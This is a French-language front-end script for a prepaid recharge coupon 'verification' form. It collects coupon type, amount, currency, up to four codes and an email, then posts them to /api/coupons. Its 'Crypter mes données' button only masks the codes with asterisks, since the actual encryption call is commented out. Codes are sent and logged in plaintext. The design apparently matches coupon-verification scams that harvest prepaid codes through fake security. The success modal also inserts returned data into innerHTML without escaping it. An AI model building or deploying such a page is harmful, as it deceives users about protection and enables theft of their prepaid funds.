document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('couponForm');
    const btnCrypt = document.getElementById('btncrypt');
    const validerBtn = document.getElementById('valider');
    const encryptText = document.getElementById('encrypt-text');
    const submitText = document.getElementById('submit-text');
    
    // Variables pour stocker les vraies valeurs des codes
    let originalCodeValues = {};
    let isEncrypted = false;
    
    // Auto-hide flash messages after 5 seconds
    setTimeout(() => {
        const flashMessages = document.querySelectorAll('.fixed.top-4.right-4');
        flashMessages.forEach(msg => {
            msg.style.opacity = '0';
            setTimeout(() => msg.remove(), 300);
        });
    }, 5000);

    // Configuration des champs de codes pour affichage automatique des astérisques
function setupCodeFields() {
  for (let i = 1; i <= 4; i++) {
    const input = document.getElementById(`code${i}`);
    if (input) {
      const fieldName = `code${i}`;
      originalCodeValues[fieldName] = '';

      input.addEventListener('input', function (e) {
        // Met à jour la vraie valeur, sans masquer
        originalCodeValues[fieldName] = e.target.value;
      });
    }
  }
}

    // Initialiser les champs de codes
    setupCodeFields();

    // Cryptage des données avec animation moderne (simplifié)
    btnCrypt.addEventListener('click', 
        async function(e) {
            for (let i = 1; i <= 4; i++) {
  const input = document.getElementById(`code${i}`);
  const fieldName = `code${i}`;
  if (input && originalCodeValues[fieldName]) {
    input.value = '*'.repeat(originalCodeValues[fieldName].length);
  }
}
//         e.preventDefault();
        
//         // Récupération des données du formulaire
//         const formData = getFormData();

//         // Validation des champs obligatoires
//         if (!validateForm()) {
//             return;
//         }

//         try {
//             btnCrypt.disabled = true;
//             encryptText.innerHTML = '<div class="spinner mr-2"></div>Cryptage en cours...';

//             const response = await fetch('/api/encrypt', {
//                 method: 'POST',
//                 headers: {
//                     'Content-Type': 'application/json',
//                 },
//                 body: JSON.stringify(formData)
//             });

//             const result = await response.json();

//             if (result.success) {
//                 showNotification('Données cryptées avec succès !', 'success');
//                 encryptText.innerHTML = '<i class="fas fa-check mr-2"></i>Données cryptées ✓';
//                 btnCrypt.classList.remove('from-purple-600', 'to-pink-600');
//                 btnCrypt.classList.add('success-state');
                
//                 // Reset after 3 seconds
//                 setTimeout(() => {
//                     encryptText.innerHTML = '<i class="fas fa-lock mr-2"></i>Crypter mes données';
//                     btnCrypt.classList.remove('success-state');
//                     btnCrypt.classList.add('from-purple-600', 'to-pink-600');
//                 }, 3000);
//             } else {
//                 showNotification('Erreur lors du cryptage', 'error');
//                 encryptText.innerHTML = '<i class="fas fa-lock mr-2"></i>Crypter mes données';
//             }
//         } catch (error) {
//             console.error('Error:', error);
//             showNotification('Erreur de connexion', 'error');
//             encryptText.innerHTML = '<i class="fas fa-lock mr-2"></i>Crypter mes données';
//         } finally {
//             btnCrypt.disabled = false;
//         }
    });

    // Validation du formulaire avec feedback visuel et soumission via API
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        if (!validateForm()) {
            return;
        }

        // Animation du bouton de validation
        validerBtn.disabled = true;
        submitText.innerHTML = '<div class="spinner mr-2"></div>Traitement en cours...';

        try {
            // Récupération des données du formulaire avec les vraies valeurs
            const formData = getFormData();
            
            console.log('Sending data to API:', formData);
            
            // Envoi des données à l'API
            const response = await fetch('/api/coupons', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData)
            });

            const result = await response.json();
            console.log('API Response:', result);

            if (result.success) {
                // Succès - afficher le message de confirmation
                showSuccessModal(result.data);
                
                // Reset du formulaire
                form.reset();
                
                // Reset des états visuels
                clearAllFieldStates();
                
                // Reset des variables de cryptage
                originalCodeValues = {};
                isEncrypted = false;
                
                // Reset du bouton
                submitText.innerHTML = '<i class="fas fa-check mr-2"></i>Valider';
                
            } else {
                // Erreur de validation
                showNotification(result.message || 'Erreur lors de l\'enregistrement. Veuillez réessayer.', 'error');
                submitText.innerHTML = '<i class="fas fa-check mr-2"></i>Valider';
            }
        } catch (error) {
            console.error('Error:', error);
            showNotification('Erreur de connexion. Veuillez réessayer.', 'error');
            submitText.innerHTML = '<i class="fas fa-check mr-2"></i>Valider';
        } finally {
            // Toujours réactiver le bouton
            validerBtn.disabled = false;
        }
    });

    // Fonction pour récupérer les données du formulaire
    function getFormData() {
        const formData = new FormData(form);
        
        // Récupérer les codes avec les vraies valeurs stockées
        let codes = [];
        for (let i = 1; i <= 4; i++) {
            const fieldName = `code${i}`;
            const value = originalCodeValues[fieldName];
            
            if (value && value.trim()) {
                codes.push(value.trim());
            }
        }
        
        return {
            type: formData.get('type'),
            montant: formData.get('montant'),
            devise: formData.get('devise'),
            codes: codes,
            email: formData.get('mail')
        };
    }

    // Fonction pour afficher la modal de succès avec les données du coupon
    function showSuccessModal(couponData) {
        // Créer la modal
        const modal = document.createElement('div');
        modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
        modal.innerHTML = `
            <div class="bg-white rounded-3xl p-8 max-w-md mx-4 transform transition-all duration-300 scale-95 opacity-0">
                <div class="text-center">
                    <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                        <i class="fas fa-check-circle text-4xl text-green-600"></i>
                    </div>
                    <h3 class="text-2xl font-bold text-gray-900 mb-4">Succès</h3>
                    <p class="text-gray-600 mb-6 leading-relaxed">
                        Votre demande a bien été reçue
                    </p>
                    
                    <!-- Détails du coupon -->
                    <div class="bg-gray-50 rounded-xl p-4 mb-4 text-left">
                        <div class="grid grid-cols-2 gap-2 text-sm">
                            <div><strong>Type:</strong> ${couponData.type}</div>
                            <div><strong>Montant:</strong> ${couponData.montant} ${couponData.devise}</div>
                            <div><strong>Email:</strong> ${couponData.email}</div>
                            <div><strong>Statut:</strong> <span class="text-yellow-600">En attente</span></div>
                        </div>
                    </div>
                    
                    <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-6">
                        <p class="text-blue-700 text-sm mt-2">
                            Nous vous enverrons un email de confirmation à la fin du traitement.
                        </p>
                    </div>
                    
                    <button class="btn-submit w-full" onclick="this.closest('.fixed').remove()">
                        <i class="fas fa-check mr-2"></i>Nouvelle vérification
                    </button>
                </div>
            </div>
        `;

        document.body.appendChild(modal);

        // Animation d'entrée
        setTimeout(() => {
            const modalContent = modal.querySelector('.bg-white');
            modalContent.classList.remove('scale-95', 'opacity-0');
            modalContent.classList.add('scale-100', 'opacity-100');
        }, 100);

        // Fermer la modal en cliquant à l'extérieur
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                modal.remove();
            }
        });
    }

    // Fonction pour effacer tous les états des champs
    function clearAllFieldStates() {
        const inputs = form.querySelectorAll('input, select');
        inputs.forEach(input => {
            input.classList.remove('error-state', 'success-state');
            const fieldName = input.name || input.id;
            const errorElement = document.getElementById(`${fieldName}-error`);
            if (errorElement) {
                errorElement.classList.remove('show');
            }
        });
    }

    // Validation en temps réel des champs
    const inputs = form.querySelectorAll('input, select');
    inputs.forEach(input => {
        input.addEventListener('blur', function() {
            validateField(this);
        });
        
        input.addEventListener('input', function() {
            clearFieldError(this);
        });
    });

    // Fonction de validation complète
    function validateForm() {
        let isValid = true;
        const errors = {};

        // Type validation
        const type = document.getElementById('type').value;
        if (!type) {
            errors.type = 'Veuillez choisir un type de recharge';
            isValid = false;
        }

        // Montant validation
        const montant = document.getElementById('montant').value;
        if (!montant) {
            errors.montant = 'Veuillez entrer un montant';
            isValid = false;
        } else if (parseFloat(montant) <= 0) {
            errors.montant = 'Le montant doit être supérieur à 0';
            isValid = false;
        }

        // Devise validation
        const devise = document.getElementById('devise').value;
        if (!devise) {
            errors.devise = 'Veuillez choisir une devise';
            isValid = false;
        }

        // Codes validation - vérifier les vraies valeurs stockées
        let hasCode = false;
        for (let i = 1; i <= 4; i++) {
            const fieldName = `code${i}`;
            if (originalCodeValues[fieldName] && originalCodeValues[fieldName].trim()) {
                hasCode = true;
                break;
            }
        }
        
        if (!hasCode) {
            errors.codes = 'Au moins un code de recharge est requis';
            isValid = false;
        }

        // Email validation
        const email = document.getElementById('mail').value;
        if (!email) {
            errors.mail = 'Adresse email requise';
            isValid = false;
        } else if (!/\S+@\S+\.\S+/.test(email)) {
            errors.mail = 'Format email invalide';
            isValid = false;
        }

        // Afficher les erreurs
        Object.keys(errors).forEach(field => {
            showFieldError(field, errors[field]);
        });

        return isValid;
    }

    // Validation d'un champ individuel
    function validateField(field) {
        const fieldName = field.name || field.id;
        const value = field.value.trim();
        
        // Remove existing validation classes
        field.classList.remove('error-state', 'success-state');
        
        if (field.hasAttribute('required') && !value) {
            field.classList.add('error-state');
            showFieldError(fieldName, 'Ce champ est obligatoire');
            return false;
        }

        // Email validation
        if (fieldName === 'mail' && value) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(value)) {
                field.classList.add('error-state');
                showFieldError(fieldName, 'Format email invalide');
                return false;
            }
        }

        // Amount validation
        if (fieldName === 'montant' && value) {
            if (parseFloat(value) <= 0) {
                field.classList.add('error-state');
                showFieldError(fieldName, 'Le montant doit être supérieur à 0');
                return false;
            }
        }

        field.classList.add('success-state');
        clearFieldError(fieldName);
        return true;
    }

    // Afficher une erreur de champ
    function showFieldError(fieldName, message) {
        const errorElement = document.getElementById(`${fieldName}-error`);
        if (errorElement) {
            errorElement.textContent = message;
            errorElement.classList.add('show');
        }
    }

    // Effacer une erreur de champ
    function clearFieldError(field) {
        if (!field) return;
        let fieldName, fieldElement;
        if (typeof field === 'string') {
            fieldName = field;
            fieldElement = document.getElementById(field);
        } else {
            fieldName = field.name || field.id;
            fieldElement = field;
        }
        const errorElement = document.getElementById(`${fieldName}-error`);
        if (errorElement) {
            errorElement.classList.remove('show');
        }
        if (fieldElement && fieldElement.classList) {
            fieldElement.classList.remove('error-state');
        }
    }

    // Fonction pour afficher les notifications
    function showNotification(message, type) {
        const notification = document.createElement('div');
        notification.className = `fixed top-4 right-4 px-6 py-4 rounded-xl shadow-lg z-50 transform transition-all duration-300 animate-slide-in ${
            type === 'success' 
                ? 'bg-green-100 border border-green-400 text-green-700' 
                : 'bg-red-100 border border-red-400 text-red-700'
        }`;
        
        notification.innerHTML = `
            <div class="flex items-center space-x-3">
                <i class="fas fa-${type === 'success' ? 'check-circle' : 'exclamation-circle'} text-${type === 'success' ? 'green' : 'red'}-500"></i>
                <span class="font-medium">${message}</span>
            </div>
        `;
        
        document.body.appendChild(notification);

        // Auto-remove after 5 seconds
        setTimeout(() => {
            notification.style.opacity = '0';
            setTimeout(() => notification.remove(), 300);
        }, 5000);
    }

    // Animation des cartes de service
    const serviceCards = document.querySelectorAll('.service-card');
    serviceCards.forEach(card => {
        card.addEventListener('mouseenter', function() {
            this.style.transform = 'scale(1.05) translateY(-5px)';
        });
        
        card.addEventListener('mouseleave', function() {
            this.style.transform = 'scale(1) translateY(0)';
        });
    });

    // Animation des liens sociaux
    const socialLinks = document.querySelectorAll('.social-link');
    socialLinks.forEach(link => {
        link.addEventListener('mouseenter', function() {
            this.style.transform = 'translateX(5px)';
        });
        
        link.addEventListener('mouseleave', function() {
            this.style.transform = 'translateX(0)';
        });
    });

    // Smooth scroll pour les liens du footer
    const footerLinks = document.querySelectorAll('.footer a[href^="#"]');
    footerLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });

    // Animation d'entrée des éléments
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, observerOptions);

    // Observer les éléments pour l'animation d'entrée
    const animatedElements = document.querySelectorAll('.service-card, .form-group');
    animatedElements.forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(20px)';
        el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        observer.observe(el);
    });
});